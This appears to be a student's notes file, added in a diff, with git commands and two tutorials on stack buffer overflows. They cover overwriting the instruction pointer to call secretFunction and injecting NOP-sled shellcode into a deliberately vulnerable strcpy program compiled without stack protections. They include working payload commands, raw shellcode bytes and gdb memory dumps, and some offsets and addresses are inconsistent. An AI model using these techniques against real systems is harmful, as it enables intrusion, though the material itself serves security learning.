@@ -1,0 +1,125 @@
+git add .
+git commit -m "upload new files"
+git push
+git status
+
+useful commands
+	Get members in group
+		grep 'group-name-here' /etc/group
+
+
+	script to run numbers in a file
+
+
+#!/bin/bash
+
+for i in {0..100}
+	do
+		echo $i | ./3runMe
+		echo $i
+	done
+
+
+noob sled
+	x90
+
+__________________________________________________________________________________
+dami tutorial - gdb overwriting instruction pointer. 
+
+	1. find where segmentation fault is
+	2. find address of the funtion we want to run
+		can do this in gdb with: disas FUNCTION HERE
+		or with objdump BINARY HERE
+	3. in gdb go through the program with different length inputs to find when we overwrite the instruction pointer
+		use same 'A' till find where it overwrites. then change to different letter if needed to find the exact placement
+	4. after finding it quit gdb and use terminal
+	5. for the last 4 bits instead of having letters we are going to change it to the address we want the program to run. 
+		in the example the addres we found for secretFunction was 0x08048444
+			this translates to '\x44\x84\x04\x08'
+			it is in reverse order in 2 number intervals 
+	6. we used: perl -e 'print "A" x 32 . "\x44\x84\x04\x08"' | ./vuln
+		this created 32 A and then had the address where secretFunction starts.
+__________________________________________________________________________________
+
+minni tutorial  - injecting shell code
+
+	her code:
+		#include <iostream>
+		#include <cstring>
+
+		using namespace std;
+
+		int main(int argc, char **argv) {
+			char str[100];
+			strcpy(str, argv[1]);
+			cout << str << endl;
+	
+			return 0;
+		}
+
+
+	1. compile code with: g++ -g -z execstack -fno-stack-protector attackMe.C -o attackMe
+		-g so can use gdb
+		-z execstack so we can execute instructions on the stack
+		-fno-stack-protector disables the default stack smashing protections
+	2. when in gdb it is useful to run 'set disable-randomization on'
+		this will ensure that it does not randomize the stack
+	3. in her code the buffer is 100
+		seen in the 'char str[100];' line
+	4. need to find the address of str
+		run in gdb to find
+			1. set disable-randomization on
+			2. break at main
+			3. run
+			4. p &str
+				finds the address of the variable str
+					0x7fffffffdf50
+			5. i f
+				finds the address of the rip
+					0x7fffffffdfc8
+			6. p 0x7fffffffdfc8 - 0x7fffffffdf50
+				p address of rip - address of variable
+				finds the difference in bits of the two addresses
+				found it to be 120 bits
+			7. we have shellcode that is 69 bytes long that prints "You've been hacked!"
+				we need to add noop sled at the beginning to make it the 120 bytes long
+			
+				original code
+				\xeb\x29\x48\x31\xdb\xb3\x0e\x48\x31\xf6\x5e\x48\x31\xc0\xb0\x01\x48\x31\xff\x40\xb7\x01\x48\x31\xd2\xb2\x15\x0f\x05\xfe\xcb\x75\xea\x48\x31\xc0\xb0\x3c\x48\x31\xff\x0f\x05\xe8\xd2\xff\xff\xff\x59\x6f\x75\x27\x76\x65\x5f\x62\x65\x65\x6e\x5f\x68\x61\x63\x6b\x65\x64\x21\x0a\x0d
+
+				code with noop sled
+				python -c 'print "\x90" * 51 + "\xeb\x29\x48\x31\xdb\xb3\x0e\x48\x31\xf6\x5e\x48\x31\xc0\xb0\x01\x48\x31\xff\x40\xb7\x01\x48\x31\xd2\xb2\x15\x0f\x05\xfe\xcb\x75\xea\x48\x31\xc0\xb0\x3c\x48\x31\xff\x0f\x05\xe8\xd2\xff\xff\xff\x59\x6f\x75\x27\x76\x65\x5f\x62\x65\x65\x6e\x5f\x68\x61\x63\x6b\x65\x64\x21\x0a\x0d
+			
+			8. in gbd x/20gx $rsp
+				this will show the addresses without it being overwritten yet
+			9. n
+				currently the break is at main, have to step forward one just to get the input in. q
+
+			10. x/20gx $rsp
+				now shows with the noop sled and the shell code.
+				need to pick an address that is apart of the noop sled. 
+				
+				0x7fffffffdec0:	0x00007fffffffe028	0x00000002004008f5
+				0x7fffffffded0:	0x9090909090909090	0x9090909090909090
+				0x7fffffffdee0:	0x9090909090909090	0x9090909090909090
+				0x7fffffffdef0:	0x9090909090909090	0x9090909090909090
+				0x7fffffffdf00:	0xdb314829eb909090	0x31485ef631480eb3
+				0x7fffffffdf10:	0xb740ff314801b0c0	0x050f15b2d2314801
+				0x7fffffffdf20:	0xb0c03148ea75cbfe	0xd2e8050fff31483c
+				0x7fffffffdf30:	0x7627756f59ffffff	0x685f6e6565625f65
+				0x7fffffffdf40:	0x0d0a2164656b6361	0x0000000041414141
+				0x7fffffffdf50:	0x0000000000000000	0x00007fffffffe028
+
+				going to pick 0x7fffffffded0 for this example. 
+			11. the address we are going to use will traslate to: \xd8\xde\xff\xff\xff\x7f\x00\x00
+				she added the two 1 bytes at the end to make it 60 bytes. probably not actually neede/
+			12. now going to replace the "AAAA" with the address
+				code going to run is: 
+					r "$(python -c 'print "\x90" * 51 + "\xeb\x29\x48\x31\xdb\xb3\x0e\x48\x31\xf6\x5e\x48\x31\xc0\xb0\x01\x48\x31\xff\x40\xb7\x01\x48\x31\xd2\xb2\x15\x0f\x05\xfe\xcb\x75\xea\x48\x31\xc0\xb0\x3c\x48\x31\xff\x0f\x05\xe8\xd2\xff\xff\xff\x59\x6f\x75\x27\x76\x65\x5f\x62\x65\x65\x6e\x5f\x68\x61\x63\x6b\x65\x64\x21\x0a\x0d" + "\xd8\xde\xff\xff\xff\x7f\x00\x00"')"
+
+			13. will stop at main. just use 'c' to contiunue through the full code. 		
+__________________________________________________________________
+
+
+			
+			
